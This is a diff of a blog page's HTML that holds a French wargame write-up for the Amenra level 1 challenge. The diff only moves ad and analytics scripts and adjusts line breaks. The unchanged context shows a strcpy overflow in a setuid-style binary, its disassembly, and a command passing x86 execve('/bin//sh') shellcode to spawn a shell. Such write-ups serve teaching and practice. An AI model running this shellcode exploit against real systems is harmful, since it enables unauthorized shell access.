@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2013/12/27/ivans-amenra-level-1.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -121,7 +101,8 @@ La preuve:
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre>level1@segment:~<span class="nv">$ </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space 
-2</pre></td></tr></tbody></table></code></pre></figure>
+2
+</pre></td></tr></tbody></table></code></pre></figure>
 
 
 On est accueilli par un message tout ce qu'il y a de plus classique :
@@ -189,7 +170,8 @@ nano &amp; vim
 gcc 4.4.5 &amp; nasm
 strace &amp; ltrace
 
-contact : ivanlef0u@tuxfamily.org</span></pre></td></tr></tbody></table></code></pre></figure>
+contact : ivanlef0u@tuxfamily.org</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 
 Ok cool, maintenant passons au level1 si vous voulez bien :).
@@ -224,7 +206,8 @@ Ok cool, maintenant passons au level1 si vous voulez bien :).
     <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">);</span>
 
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 
 Comme d'hab', on va regarder le code assembleur :
@@ -262,7 +245,8 @@ Dump of assembler code <span class="k">for function </span>main:
    0x080483e1 &lt;+29&gt;: leave  
    0x080483e2 &lt;+30&gt;: ret    
 End of assembler dump.
-gdb<span class="nv">$ </span>quit</pre></td></tr></tbody></table></code></pre></figure>
+gdb<span class="nv">$ </span>quit
+</pre></td></tr></tbody></table></code></pre></figure>
 
 
 Bon reste plus qu'à poutrer ça le plus simplement du monde :).
@@ -276,7 +260,8 @@ En reconstruisant la stack de tête, on a un truc du genre:
 </pre></td><td class="code"><pre>ret
 sfp
 buffer+4
-buffer</pre></td></tr></tbody></table></code></pre></figure>
+buffer
+</pre></td></tr></tbody></table></code></pre></figure>
 
 
 On copie argv dans buffer or argv est un tableau de pointeurs des arguments passés au programme. Le premier argument étant le nom du programme, il faut passer 3 arguments supplémentaires.
@@ -286,7 +271,8 @@ Ce qui va se passer est que l'adresse de notre 4 ème argument va overwriter l'a
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre>level1@segment:~<span class="nv">$ </span>~/level1 a b <span class="sb">`</span><span class="nb">printf</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span><span class="sb">`</span>
-<span class="nv">$ </span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="nv">$ </span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 
 Pawned,
@@ -399,6 +385,26 @@ m_101
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
